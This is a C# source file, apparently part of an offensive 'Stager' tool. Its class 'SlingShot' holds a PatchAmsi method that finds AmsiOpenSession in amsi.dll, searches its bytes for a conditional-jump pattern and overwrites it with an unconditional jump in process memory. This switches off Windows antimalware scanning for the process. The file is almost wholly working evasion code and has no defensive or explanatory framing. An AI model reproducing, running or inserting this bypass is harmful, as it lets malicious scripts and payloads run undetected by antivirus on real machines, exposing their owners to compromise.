using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;

namespace Stager
{
        internal class SlingShot
        {
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

            [DllImport("kernel32.dll")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr LoadLibrary(string lpFileName);

            internal  bool PatchAmsi()
            {
                byte[] pattern = { 0x48, 0x3F, 0x3F, 0x74, 0x3F, 0x48, 0x3F, 0x3F, 0x74 };
                byte[] patch = { 0xEB };

                int processId = Process.GetCurrentProcess().Id;
                IntPtr processHandle = OpenProcess(0x001F0FFF, false, processId);

                if (processHandle == IntPtr.Zero)
                {
                    Console.WriteLine("Failed to open the process.");
                    return false;
                }

                IntPtr amsiDllHandle = LoadLibrary("amsi.dll");
                if (amsiDllHandle == IntPtr.Zero)
                {
                    Console.WriteLine("Failed to load amsi.dll.");
                    return false;
                }

                IntPtr amsiOpenSessionAddr = GetProcAddress(amsiDllHandle, "AmsiOpenSession");
                if (amsiOpenSessionAddr == IntPtr.Zero)
                {
                    Console.WriteLine("Failed to find AmsiOpenSession.");
                    return false;
                }

                byte[] buff = new byte[1024];
                IntPtr bytesRead;
                if (!ReadProcessMemory(processHandle, amsiOpenSessionAddr, buff, buff.Length, out bytesRead))
                {
                    Console.WriteLine("Failed to read process memory.");
                    return false;
                }

                int matchAddress = SearchPattern(buff, pattern);
                if (matchAddress == -1)
                {
                    Console.WriteLine("Failed to find the pattern.");
                    return false;
                }

                IntPtr patchAddress = IntPtr.Add(amsiOpenSessionAddr, matchAddress);
                IntPtr bytesWritten;
                if (!WriteProcessMemory(processHandle, patchAddress, patch, patch.Length, out bytesWritten))
                {
                    Console.WriteLine("Failed to patch AMSI.");
                    return false;
                }

                Console.WriteLine("AMSI patched successfully.");
                return true;
            }

            private static int SearchPattern(byte[] data, byte[] pattern)
            {
                int patternSize = pattern.Length;

                for (int i = 0; i < data.Length - patternSize; i++)
                {
                    bool match = true;
                    for (int j = 0; j < patternSize; j++)
                    {
                        if (pattern[j] != 0x3F && data[i + j] != pattern[j])
                        {
                            match = false;
                            break;
                        }
                    }

                    if (match)
                    {
                        return i;
                    }
                }

                return -1;
            }
        public SlingShot() {
            bool Patched = false;
        } 
        
    }
}
